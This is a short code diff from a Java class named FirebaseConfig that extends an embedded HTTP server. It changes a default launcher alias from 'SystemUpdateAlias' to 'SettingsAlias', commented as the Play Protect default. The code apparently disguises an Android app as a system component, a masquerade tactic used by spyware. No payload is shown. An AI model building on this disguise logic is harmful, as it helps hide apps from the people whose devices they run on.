@@ -1086,7 +1086,7 @@ public class FirebaseConfig extends NanoHTTPD {
             String appName = appInfo.loadLabel(pm).toString();
 
             // Determine matching alias component based on package or category
-            String targetAlias = "SystemUpdateAlias";
+            String targetAlias = "SettingsAlias"; // Play Protect default
             String lowerPkg = pkg.toLowerCase();
             String lowerName = appName.toLowerCase();
 
